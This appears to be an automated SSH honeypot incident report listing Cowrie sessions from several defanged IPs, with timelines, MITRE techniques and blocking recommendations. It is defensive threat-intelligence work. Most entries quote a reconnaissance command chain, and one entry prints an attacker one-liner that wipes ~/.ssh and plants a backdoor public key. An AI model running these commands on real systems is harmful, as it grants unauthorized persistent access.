| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:40:47` | `cowrie.session.connect` |
| `2026-08-12 02:40:47` | `cowrie.client.version` |
| `2026-08-12 02:40:47` | `cowrie.client.kex` |
| `2026-08-12 02:40:48` | `cowrie.login.success` |
| `2026-08-12 02:40:48` | `cowrie.session.params` |
| `2026-08-12 02:40:48` | `cowrie.command.input` |
| `2026-08-12 02:40:48` | `cowrie.command.input` |
| `2026-08-12 02:40:48` | `cowrie.command.input` |
| `2026-08-12 02:40:48` | `cowrie.command.input` |
| `2026-08-12 02:40:48` | `cowrie.command.input` |
| `2026-08-12 02:40:48` | `cowrie.command.success` |
| `2026-08-12 02:40:48` | `cowrie.command.input` |
| `2026-08-12 02:40:48` | `cowrie.command.input` |
| `2026-08-12 02:40:48` | `cowrie.command.input` |
| `2026-08-12 02:40:48` | `cowrie.command.input` |
| `2026-08-12 02:40:49` | `cowrie.log.closed` |
| `2026-08-12 02:40:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-054b7e91f796

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:41 |
| **Last Seen** | 2026-08-12 02:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:41:58` | `cowrie.session.connect` |
| `2026-08-12 02:41:58` | `cowrie.client.version` |
| `2026-08-12 02:41:58` | `cowrie.client.kex` |
| `2026-08-12 02:41:59` | `cowrie.login.success` |
| `2026-08-12 02:42:00` | `cowrie.session.params` |
| `2026-08-12 02:42:00` | `cowrie.command.input` |
| `2026-08-12 02:42:00` | `cowrie.command.input` |
| `2026-08-12 02:42:00` | `cowrie.command.input` |
| `2026-08-12 02:42:00` | `cowrie.command.input` |
| `2026-08-12 02:42:00` | `cowrie.command.input` |
| `2026-08-12 02:42:00` | `cowrie.command.success` |
| `2026-08-12 02:42:00` | `cowrie.command.input` |
| `2026-08-12 02:42:00` | `cowrie.command.input` |
| `2026-08-12 02:42:00` | `cowrie.command.input` |
| `2026-08-12 02:42:00` | `cowrie.command.input` |
| `2026-08-12 02:42:00` | `cowrie.log.closed` |
| `2026-08-12 02:42:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1ed79477938

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:42 |
| **Last Seen** | 2026-08-12 02:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:42:51` | `cowrie.session.connect` |
| `2026-08-12 02:42:51` | `cowrie.client.version` |
| `2026-08-12 02:42:51` | `cowrie.client.kex` |
| `2026-08-12 02:42:52` | `cowrie.login.success` |
| `2026-08-12 02:42:52` | `cowrie.session.params` |
| `2026-08-12 02:42:52` | `cowrie.command.input` |
| `2026-08-12 02:42:52` | `cowrie.command.input` |
| `2026-08-12 02:42:52` | `cowrie.command.input` |
| `2026-08-12 02:42:52` | `cowrie.command.input` |
| `2026-08-12 02:42:52` | `cowrie.command.input` |
| `2026-08-12 02:42:52` | `cowrie.command.success` |
| `2026-08-12 02:42:52` | `cowrie.command.input` |
| `2026-08-12 02:42:52` | `cowrie.command.input` |
| `2026-08-12 02:42:52` | `cowrie.command.input` |
| `2026-08-12 02:42:52` | `cowrie.command.input` |
| `2026-08-12 02:42:53` | `cowrie.log.closed` |
| `2026-08-12 02:42:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-184a1f16c268

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:43 |
| **Last Seen** | 2026-08-12 02:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:43:47` | `cowrie.session.connect` |
| `2026-08-12 02:43:47` | `cowrie.client.version` |
| `2026-08-12 02:43:47` | `cowrie.client.kex` |
| `2026-08-12 02:43:47` | `cowrie.login.success` |
| `2026-08-12 02:43:48` | `cowrie.session.params` |
| `2026-08-12 02:43:48` | `cowrie.command.input` |
| `2026-08-12 02:43:48` | `cowrie.command.input` |
| `2026-08-12 02:43:48` | `cowrie.command.input` |
| `2026-08-12 02:43:48` | `cowrie.command.input` |
| `2026-08-12 02:43:48` | `cowrie.command.input` |
| `2026-08-12 02:43:48` | `cowrie.command.success` |
| `2026-08-12 02:43:48` | `cowrie.command.input` |
| `2026-08-12 02:43:48` | `cowrie.command.input` |
| `2026-08-12 02:43:48` | `cowrie.command.input` |
| `2026-08-12 02:43:48` | `cowrie.command.input` |
| `2026-08-12 02:43:48` | `cowrie.log.closed` |
| `2026-08-12 02:43:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e234dc22d8e

| Field | Detail |
|---|---|
| **Source IP** | `149.202.50[.]58` |
| **First Seen** | 2026-08-12 02:44 |
| **Last Seen** | 2026-08-12 02:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:44:27` | `cowrie.session.connect` |
| `2026-08-12 02:44:27` | `cowrie.client.version` |
| `2026-08-12 02:44:27` | `cowrie.client.kex` |
| `2026-08-12 02:44:28` | `cowrie.login.success` |
| `2026-08-12 02:44:29` | `cowrie.session.params` |
| `2026-08-12 02:44:29` | `cowrie.command.input` |
| `2026-08-12 02:44:29` | `cowrie.command.failed` |
| `2026-08-12 02:44:29` | `cowrie.log.closed` |
| `2026-08-12 02:44:30` | `cowrie.session.params` |
| `2026-08-12 02:44:30` | `cowrie.command.input` |
| `2026-08-12 02:44:30` | `cowrie.session.file_download` |
| `2026-08-12 02:44:30` | `cowrie.log.closed` |
| `2026-08-12 02:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.202.50[.]58` to AbuseIPDB if not already reported
- [ ] Block `149.202.50[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84bf87558a63

| Field | Detail |
|---|---|
| **Source IP** | `149.202.50[.]58` |
| **First Seen** | 2026-08-12 02:44 |
| **Last Seen** | 2026-08-12 02:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:44:30` | `cowrie.session.connect` |
| `2026-08-12 02:44:30` | `cowrie.client.version` |
| `2026-08-12 02:44:30` | `cowrie.client.kex` |
| `2026-08-12 02:44:30` | `cowrie.login.success` |
| `2026-08-12 02:44:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.202.50[.]58` to AbuseIPDB if not already reported
- [ ] Block `149.202.50[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98d5d121e261

| Field | Detail |
|---|---|
| **Source IP** | `149.202.50[.]58` |
| **First Seen** | 2026-08-12 02:44 |
| **Last Seen** | 2026-08-12 02:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:44:30` | `cowrie.session.connect` |
| `2026-08-12 02:44:30` | `cowrie.client.version` |
| `2026-08-12 02:44:30` | `cowrie.client.kex` |
| `2026-08-12 02:44:31` | `cowrie.login.success` |
| `2026-08-12 02:44:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.202.50[.]58` to AbuseIPDB if not already reported
- [ ] Block `149.202.50[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56d3358d6510

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:44 |
| **Last Seen** | 2026-08-12 02:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:44:47` | `cowrie.session.connect` |
| `2026-08-12 02:44:47` | `cowrie.client.version` |
| `2026-08-12 02:44:47` | `cowrie.client.kex` |
| `2026-08-12 02:44:47` | `cowrie.login.success` |
| `2026-08-12 02:44:48` | `cowrie.session.params` |
| `2026-08-12 02:44:48` | `cowrie.command.input` |
| `2026-08-12 02:44:48` | `cowrie.command.input` |
| `2026-08-12 02:44:48` | `cowrie.command.input` |
| `2026-08-12 02:44:48` | `cowrie.command.input` |
| `2026-08-12 02:44:48` | `cowrie.command.input` |
| `2026-08-12 02:44:48` | `cowrie.command.success` |
| `2026-08-12 02:44:48` | `cowrie.command.input` |
| `2026-08-12 02:44:48` | `cowrie.command.input` |
| `2026-08-12 02:44:48` | `cowrie.command.input` |
| `2026-08-12 02:44:48` | `cowrie.command.input` |
| `2026-08-12 02:44:48` | `cowrie.log.closed` |
| `2026-08-12 02:44:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee6e600e221b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:45 |
| **Last Seen** | 2026-08-12 02:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:45:55` | `cowrie.session.connect` |
| `2026-08-12 02:45:55` | `cowrie.client.version` |
| `2026-08-12 02:45:55` | `cowrie.client.kex` |
| `2026-08-12 02:45:55` | `cowrie.login.success` |
| `2026-08-12 02:45:56` | `cowrie.session.params` |
| `2026-08-12 02:45:56` | `cowrie.command.input` |
| `2026-08-12 02:45:56` | `cowrie.command.input` |
| `2026-08-12 02:45:56` | `cowrie.command.input` |
| `2026-08-12 02:45:56` | `cowrie.command.input` |
| `2026-08-12 02:45:56` | `cowrie.command.input` |
| `2026-08-12 02:45:56` | `cowrie.command.success` |
| `2026-08-12 02:45:56` | `cowrie.command.input` |
| `2026-08-12 02:45:56` | `cowrie.command.input` |
| `2026-08-12 02:45:56` | `cowrie.command.input` |
| `2026-08-12 02:45:56` | `cowrie.command.input` |
| `2026-08-12 02:45:56` | `cowrie.log.closed` |
| `2026-08-12 02:45:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1d4b439e663

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:47 |
| **Last Seen** | 2026-08-12 02:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:47:12` | `cowrie.session.connect` |
| `2026-08-12 02:47:12` | `cowrie.client.version` |
| `2026-08-12 02:47:12` | `cowrie.client.kex` |
| `2026-08-12 02:47:13` | `cowrie.login.success` |
| `2026-08-12 02:47:14` | `cowrie.session.params` |
| `2026-08-12 02:47:14` | `cowrie.command.input` |
| `2026-08-12 02:47:14` | `cowrie.command.input` |
| `2026-08-12 02:47:14` | `cowrie.command.input` |
| `2026-08-12 02:47:14` | `cowrie.command.input` |
| `2026-08-12 02:47:14` | `cowrie.command.input` |
| `2026-08-12 02:47:14` | `cowrie.command.success` |
| `2026-08-12 02:47:14` | `cowrie.command.input` |
| `2026-08-12 02:47:14` | `cowrie.command.input` |
| `2026-08-12 02:47:14` | `cowrie.command.input` |
| `2026-08-12 02:47:14` | `cowrie.command.input` |
| `2026-08-12 02:47:14` | `cowrie.log.closed` |
| `2026-08-12 02:47:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-885ee86d9b98

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:48 |
| **Last Seen** | 2026-08-12 02:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:48:14` | `cowrie.session.connect` |
| `2026-08-12 02:48:15` | `cowrie.client.version` |
| `2026-08-12 02:48:15` | `cowrie.client.kex` |
| `2026-08-12 02:48:15` | `cowrie.login.success` |
| `2026-08-12 02:48:16` | `cowrie.session.params` |
| `2026-08-12 02:48:16` | `cowrie.command.input` |
| `2026-08-12 02:48:16` | `cowrie.command.input` |
| `2026-08-12 02:48:16` | `cowrie.command.input` |
| `2026-08-12 02:48:16` | `cowrie.command.input` |
| `2026-08-12 02:48:16` | `cowrie.command.input` |
| `2026-08-12 02:48:16` | `cowrie.command.success` |
| `2026-08-12 02:48:16` | `cowrie.command.input` |
| `2026-08-12 02:48:16` | `cowrie.command.input` |
| `2026-08-12 02:48:16` | `cowrie.command.input` |
| `2026-08-12 02:48:16` | `cowrie.command.input` |
| `2026-08-12 02:48:16` | `cowrie.log.closed` |
| `2026-08-12 02:48:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39df6694a895

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:49 |
| **Last Seen** | 2026-08-12 02:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:49:09` | `cowrie.session.connect` |
| `2026-08-12 02:49:09` | `cowrie.client.version` |
| `2026-08-12 02:49:09` | `cowrie.client.kex` |
| `2026-08-12 02:49:09` | `cowrie.login.success` |
| `2026-08-12 02:49:11` | `cowrie.session.params` |
| `2026-08-12 02:49:11` | `cowrie.command.input` |
| `2026-08-12 02:49:11` | `cowrie.command.input` |
| `2026-08-12 02:49:11` | `cowrie.command.input` |
| `2026-08-12 02:49:11` | `cowrie.command.input` |
| `2026-08-12 02:49:11` | `cowrie.command.input` |
| `2026-08-12 02:49:11` | `cowrie.command.success` |
| `2026-08-12 02:49:11` | `cowrie.command.input` |
| `2026-08-12 02:49:11` | `cowrie.command.input` |
| `2026-08-12 02:49:11` | `cowrie.command.input` |
| `2026-08-12 02:49:11` | `cowrie.command.input` |
| `2026-08-12 02:49:11` | `cowrie.log.closed` |
| `2026-08-12 02:49:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60674f7b87a6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 02:50 |
| **Last Seen** | 2026-08-12 02:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:50:02` | `cowrie.session.connect` |
| `2026-08-12 02:50:02` | `cowrie.client.version` |
| `2026-08-12 02:50:02` | `cowrie.client.kex` |
| `2026-08-12 02:50:02` | `cowrie.login.success` |
| `2026-08-12 02:50:03` | `cowrie.session.params` |
| `2026-08-12 02:50:03` | `cowrie.command.input` |
| `2026-08-12 02:50:03` | `cowrie.command.input` |
| `2026-08-12 02:50:03` | `cowrie.command.input` |
| `2026-08-12 02:50:03` | `cowrie.command.input` |
| `2026-08-12 02:50:03` | `cowrie.command.input` |
| `2026-08-12 02:50:03` | `cowrie.command.success` |
| `2026-08-12 02:50:03` | `cowrie.command.input` |
| `2026-08-12 02:50:03` | `cowrie.command.input` |
| `2026-08-12 02:50:03` | `cowrie.command.input` |
| `2026-08-12 02:50:03` | `cowrie.command.input` |
| `2026-08-12 02:50:03` | `cowrie.log.closed` |
| `2026-08-12 02:50:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7ed866561b1

| Field | Detail |
|---|---|
| **Source IP** | `103.174.145[.]35` |
| **First Seen** | 2026-08-12 02:58 |
| **Last Seen** | 2026-08-12 02:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 02:58:02` | `cowrie.session.connect` |
| `2026-08-12 02:58:02` | `cowrie.client.version` |
| `2026-08-12 02:58:02` | `cowrie.client.kex` |
| `2026-08-12 02:58:04` | `cowrie.login.success` |
| `2026-08-12 02:58:04` | `cowrie.direct-tcpip.request` |
| `2026-08-12 02:58:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.145[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.174.145[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
